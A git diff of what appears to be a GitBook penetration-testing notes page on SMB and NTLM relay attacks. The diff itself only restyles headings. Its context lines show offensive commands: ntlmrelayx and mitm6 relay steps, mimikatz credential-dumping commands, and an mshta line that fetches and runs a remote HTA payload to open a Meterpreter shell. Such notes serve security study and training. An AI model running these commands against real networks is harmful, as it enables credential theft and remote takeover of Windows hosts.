@@ -1,10 +1,10 @@
 # ⭕ SMB/NTLM Relay
 
-## SMB relay
+## <mark style="color:red;">SMB relay</mark>
 
 instead of cracking the hashes relay theme to specific machines and potentially gain access smb signing must be disabled on the target relayed user credentials must be admin on machine.
 
-## NT/NTLM
+## <mark style="color:red;">NT/NTLM</mark>
 
 The authentication protocol used between Windows clients and servers is called NTLM (NT LAN Manager). Although NTLM has been replaced by Kerberos, it is still widely used and supported in Windows machines. For example, it is used either when the client is authenticating to a server using an IP address or, when the client is authenticating to a server that does not belong to the same domain.
 
@@ -80,7 +80,7 @@ No diffusion, meaning that each part of DES output is not linked to the previous
 
 #### • Use Man-in-the-Middle techniques in order to sniff the client response
 
-## SMB Relay with Metasploit
+## <mark style="color:red;">SMB Relay with Metasploit</mark>
 
 The first item we need to address in this exploitation process, is to create a listening SMB service that will both accept incoming connections, and send back a fixed challenge. As you can imagine, we use a fixed challenge to help us in decrypting the response. Although there are many tools that allow us to do this, we will use the following Metasploit module:
 
@@ -124,7 +124,7 @@ It is very useful to know that when the password length is less than or equal to
 
 {% embed url="https://blog.rapid7.com/2016/07/26/capturing-credentials-on-an-internal-network/" %}
 
-## Using Responder
+## <mark style="color:red;">Using Responder</mark>
 
 first go to responder config file and disable smb and http:
 
@@ -166,7 +166,7 @@ python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf target.txt -s
 
 ![](<../../../.gitbook/assets/image (223).png>)
 
-## Get an SMB Shell
+## <mark style="color:red;">Get an SMB Shell</mark>
 
 ```
 python mitm6.py -d megacorp.local -i vboxnet0
@@ -218,7 +218,7 @@ mimi sekurlsa::wdigest
 mimi sekurlsa::Kerberos​
 ```
 
-## Meterpreter Shell
+## <mark style="color:red;">Meterpreter Shell</mark>
 
 #### we can also use this cmd shell to pop a meterpreter shell:
 
@@ -237,6 +237,6 @@ mshta.exe http://192.168.56.1:8080/BdssjDFeW7IDPKF.hta
 
 #### done!
 
-### other ways to get a meterpreter shell:
+### <mark style="color:orange;">other ways to get a meterpreter shell:</mark>
 
 {% embed url="https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/" %}
